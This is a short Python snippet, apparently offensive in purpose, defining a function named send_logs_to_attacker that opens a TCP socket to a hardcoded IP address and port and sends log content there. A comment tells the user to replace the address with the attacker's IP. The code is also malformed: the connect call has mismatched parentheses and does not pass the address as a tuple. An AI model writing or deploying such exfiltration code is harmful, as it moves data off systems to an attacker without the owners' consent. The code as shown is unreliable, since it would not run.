import socket

def send_logs_to_attacker(log_content):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect("210.50.178.96", 5005))  # Replace with attacker's IP and port
    s.sendall(log_content.encode())
    s.close()